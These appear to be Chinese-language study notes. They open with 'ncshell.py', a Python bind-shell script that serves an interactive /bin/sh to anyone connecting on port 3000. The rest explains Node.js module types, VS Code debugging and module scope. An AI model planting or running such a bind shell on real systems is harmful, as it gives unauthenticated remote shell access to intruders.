ncshell.py

这里稍微改了网上的 tty 脚本，就可以复用了。为了兼容性就没有用到 print 了。

import socket
import subprocess


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind(('0.0.0.0', 3000))

server_socket.listen(5)

client_sockets = []


def handle_client(talk):

    proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,

                stdout=talk, stderr=talk, shell=True)

while True:


    client_socket, address = server_socket.accept()

    client_sockets.append(client_socket)

    handle_client(client_socket)

node module

Javascript 的模块化 提高了代码的复用性、提高了代码的可维护性、可以实现按需加载。

nodejs 中采用commonJS模块规范。模块化也使得nodejs更容易被应用与较大的工程项目。

nodejs模块一般包含以下四种，分别是c/c++原生模块，native本地js模块，三方js模块，用户c++扩展。

C/C++ 原生模块

C/C++ 模块也叫 built-in 模块，一般不直接调用，而是在 native 模块中调用，然后再 require 导入。

由于 Node.js 是基于 C++ 开发的(底层用 chrome v8 做 js 引擎与 libuv 完成事件循环机制)，因此它的所有底层头文件暴露的 API 也都是适用于 C++ 的。

  • 这一类模块最接近底层，难以调试。

native本地js模块

native 模块Node 自带模块，比如我们在 Node.js 中常用的 buffer，fs，os 等都是 native 模块，这些模块不需要 npm install 便可以直接使用。其源代码可以在 node/lib at main · nodejs/node 或是 node/lib/internal at main · nodejs/node 中找到。其中lib目录下（不含子目录）的文件可以直接通过require()调用，./internal及其他lib的子目录下文件默认由Node.js内核调用，不允许require()导入。

  • 这一类模块在本地的存储形式经过了一定的预处理，使用vscode调试时可以追踪（目录显示为）。

三方js模块

三方模块即非 Node.js 源码自带的模块，比如 express，webpack，koa等等，使用 npm 之类的包管理工具下载，或在 javascript 文件中使用module.export导出的模块。

  • 三方js模块是以源代码形式存放的，查看node_modules包下文件即可发现（全局模块位置可以通过npm ls -g找到)。可追踪调试。

用户 C++ 扩展

用户 C++ 扩展使得 cpp 文件与 Node.js 程式协作，常应用于大计算量场合以提高效率。在C++中使用NODE_MODULE_CONTEXT_AWARE_BUILTIN宏注册到模块链表以调用扩展。

  • 一般只能通过针对C/C++的调试工具进行。

使用vscode进行调试

当在模块名称xxx上单击CTRL+MOUSE_CLICK时，Visual Studio将转到那个“仅键入”的文件，或是只能找到xxx.d.ts，不包含任何实现，它只包含类型化的函数，没有具体实现。这是集成开发环境造成的结果。

而Visual Studio中调试模式中的“单步执行”选项将引导找到真正的源代码。

Global与作用域

在 Node 中全局变量是在多个模块下共享的。当前运行文件为 a.js ，那么 a.js 也被是为一个模块。所有模块均在全局环境 Global 下运行。

对于某一模块运行时可以视为在全局环境下运行如下函数

//...上文
function(exports, module, require, __dirname, __filename){ <code> }
//...下文
